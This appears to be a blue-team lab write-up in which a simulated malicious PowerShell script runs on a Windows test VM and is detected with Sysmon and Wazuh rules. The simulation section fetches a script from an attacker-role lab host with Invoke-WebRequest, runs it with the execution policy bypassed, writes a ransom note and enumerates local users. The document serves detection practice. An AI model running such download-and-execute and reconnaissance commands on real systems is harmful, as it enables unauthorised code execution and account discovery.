# Phase 2: Scenario 2 - Malicious Script Execution

## Attack Overview
- **Description**: Simulated a malicious PowerShell script executed directly on the Windows VM, performing actions like creating a ransomware-like file, enumerating users, and attempting network communication. This mimics an insider threat or compromised user executing a script for reconnaissance or data exfiltration.
- **MITRE ATT&CK**: 
  - [T1059.001 - Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/)
  - [T1087.002 - Account Discovery: Local Account](https://attack.mitre.org/techniques/T1087/002/)
  - [T1071.001 - Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001/)
- **Objective**: Demonstrate detection of malicious PowerShell script execution, file creation, and network activity using Sysmon and Wazuh on Windows.
- **Date and Time**: June 14, 2025, ~11:51 PM IST

## Simulation Details
- **Environment**: 
  - **Target**: Windows 10 (hostname: `DESKTOP-FF0MPJM`, IP: `192.168.1.101`, Wazuh agent: `SIEM-Target-Windows`).
  - **Attacker**: Script executed locally; optional file download from Arch Linux (IP: `192.168.1.55`).
- **Sysmon Config**: SwiftOnSecurity `sysmonconfig-export.xml`.
- **Simulation Command From Arch Linux (Optional)**:
  ```bash
  echo 'Write-Output "Malicious PowerShell script executed" | Out-File -FilePath C:\Temp\ransom.txt; net user > C:\Temp\user_list.txt; whoami >> C:\Temp\user_list.txt; ping 192.168.1.55 -n 4' > /tmp/malicious.ps1
  python3 -m http.server 80 -d /tmp/
  ```
- **Simulation Command From Windows**:
  - **Option 1: Download and Execute**:
    ```powershell
    Invoke-WebRequest -Uri http://192.168.1.55:80/malicious.ps1 -OutFile C:\Temp\malicious.ps1
    powershell -ExecutionPolicy Bypass -File C:\Temp\malicious.ps1
    ```
  - **Option 2: Direct Execution**:
    ```powershell
    Set-Content -Path C:\Temp\malicious.ps1 -Value 'Write-Output "Malicious PowerShell script executed" | Out-File -FilePath C:\Temp\ransom.txt; net user > C:\Temp\user_list.txt; whoami >> C:\Temp\user_list.txt; ping 192.168.1.55 -n 4'
    powershell -ExecutionPolicy Bypass -File C:\Temp\malicious.ps1
    ```
- **Execution**:
  1. Created `malicious.ps1` (downloaded or locally created).
  2. Executed the script, which:
     - Created `C:\Temp\ransom.txt`.
     - Ran `net user` and `whoami`, saving to `C:\Temp\user_list.txt`.
     - Pinged `192.168.1.55`.
  3. Verified outputs: `type C:\Temp\ransom.txt`, `type C:\Temp\user_list.txt`.
- **Expected Events**:
  - **Sysmon Event ID 11**: File creation of `C:\Temp\malicious.ps1`, `C:\Temp\ransom.txt`, `C:\Temp\user_list.txt`.
  - **Sysmon Event ID 1**: Process creation of `powershell.exe`, `net.exe`, `whoami.exe`, `ping.exe`.
  - **Sysmon Event ID 3**: Network connection to `192.168.1.55`.
  - **Wazuh**: Alerts triggered by rule IDs 100002 and 100004.

## Detection in Wazuh
- **Wazuh Rules**:
  - Rule ID 100002 (script execution):
    ```xml
    <rule id="100002" level="13">
      <if_sid>61601</if_sid>
      <field name="sysmon.image">powershell\.exe|cmd\.exe</field>
      <field name="sysmon.command_line">C:\\Temp\\|C:\\Users\\|meterpreter</field>
      <description>Malicious script execution via Meterpreter</description>
      <mitre>
        <id>T1059.001</id>
        <id>T1059.003</id>
      </mitre>
    </rule>
    ```
  - Rule ID 100004 (beaconing):
    ```xml
    <rule id="100004" level="12">
      <if_sid>61603</if_sid>
      <field name="sysmon.destination_ip">192\.168\.1\.55</field>
      <field name="sysmon.destination_port">80|443</field>
      <description>Potential beaconing to attacker IP</description>
      <mitre>
        <id>T1071.001</id>
      </mitre>
    </rule>
    ```
- **Search Query** (Wazuh Dashboard > Security Events > Discover):
  ```kql
  rule.id:(100002 OR 100004) AND agent.name:SIEM-Target-Windows AND (sysmon.image:"powershell.exe" OR sysmon.destination_ip:"192.168.1.55")
  ```
- **Findings**:
  - Observed 1+ alerts with `rule.id:100002` for `powershell.exe` executing `C:\Temp\malicious.ps1`.
  - Observed 1+ alerts with `rule.id:100004` for `ping.exe` to `192.168.1.55`.
  - Sysmon Event ID 11 logged file creations.
  - Event ID 1 captured `powershell.exe`, `net.exe`, `whoami.exe`, `ping.exe`.
  - Event ID 3 logged network connection.
  - High `rule.level:13` and `12` indicate critical alerts.
- **Screenshots**:
  - `Screenshots/wazuh_alerts_script.png`: Wazuh Dashboard alert list.
  - `Screenshots/sysmon_log_script.png`: Sysmon events in Event Viewer.
  - `Screenshots/powershell_output.png`: PowerShell script output.
- **Logs**:
  - `Logs/sysmon_events_script.evtx`: Exported Sysmon logs.
  - `Logs/wazuh_agent_filtered_script.log`: Wazuh agent log entries.

## Learnings
- **Blue Teaming Insight**: Malicious PowerShell scripts performing file creation, process execution, and network activity are highly detectable. Sysmon’s granular logging and Wazuh’s rules pinpoint unauthorized actions in `C:\Temp`.
- **Challenges**: Legitimate scripts in `C:\Temp` may trigger false positives; filtering by specific commands reduces noise. Network-based rules may need tuning.
- **Technical Growth**: Learned to craft realistic malicious PowerShell scripts, analyze Sysmon events, and combine KQL queries for script and network alerts.
- **Best Practice**: Monitor `C:\Temp` for suspicious files, audit `powershell.exe` command lines, and set alerts for unexpected network destinations.

## Detection Logic Query
```kql
rule.id:(100002 OR 100004) AND agent.name:SIEM-Target-Windows AND (sysmon.image:"powershell.exe" OR sysmon.destination_ip:"192.168.1.55")
```
- **Purpose**: Identifies malicious script execution and potential beaconing.
- **Outcome**: High-severity alerts for unauthorized activity.

## References
- [MITRE ATT&CK: PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [MITRE ATT&CK: Account Discovery](https://attack.mitre.org/techniques/T1087/002/)
- [MITRE ATT&CK: Application Layer Protocol](https://attack.mitre.org/techniques/T1071/001/)
- [Wazuh Documentation: Sysmon Integration](https://documentation.wazuh.com/current/user-manual/ruleset/sysmon.html)

## Attachments
- **Logs**: [DetectAndDefend/Phase2/Scenario-2-MaliciousScriptExecution/Logs/]()
- **Screenshots**:
  1. [Attack Simulation in PowerShell](/DetectAndDefend/Phase2/Scenario-2-MaliciousScriptExecution/Screenshots/attack-command-powershell.png)
  2. [Wazuh Dashboard with Event Logs](/DetectAndDefend/Phase2/Scenario-2-MaliciousScriptExecution/Screenshots/wazuh-dashboard-event-logs.png)
  3. [Wazuh Dashboard with Event Logs Only!](/DetectAndDefend/Phase2/Scenario-2-MaliciousScriptExecution/Screenshots/event-logs-script.png)